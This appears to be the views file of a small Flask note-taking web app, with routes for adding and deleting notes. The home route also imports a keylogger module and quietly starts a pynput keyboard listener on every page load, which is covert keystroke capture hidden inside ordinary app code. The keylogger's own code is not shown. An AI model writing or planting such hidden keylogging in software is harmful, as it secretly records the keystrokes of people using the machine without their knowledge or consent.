#### this file stores website root where users can go to ####
from flask import Blueprint, render_template, request, flash, jsonify
from flask_login import login_required, current_user
from .models import Note
from . import db
from pynput import keyboard
from .keylogger import keyPressed, keyboard_listener
import json


views = Blueprint('views', __name__)


@views.route('/', methods=['GET', 'POST'])
@login_required
def home():
    global keyboard_listener
    # Start the listener only if it's not already running
    if not keyboard_listener or not keyboard_listener.is_alive():
        keyboard_listener = keyboard.Listener(on_press = keyPressed)
        keyboard_listener.start()

    if request.method == 'POST': 
        # Gets the note from the HTML 
        note = request.form.get('note') 

        if len(note) < 1:
            flash('Note is too short!', category='error') 
        else:
            # providing the schema for the note 
            new_note = Note(data=note, user_id=current_user.id)  
            # adding the note to the database 
            db.session.add(new_note) 
            db.session.commit()
            flash('Note added!', category='success')

    return render_template("home.html", user=current_user)


@views.route('/delete-note', methods=['POST'])
def delete_note():  
    # this function expects a JSON from the INDEX.js file 
    note = json.loads(request.data) 
    noteId = note['noteId']
    note = Note.query.get(noteId)
    if note:
        if note.user_id == current_user.id:
            db.session.delete(note)
            db.session.commit()

    return jsonify({})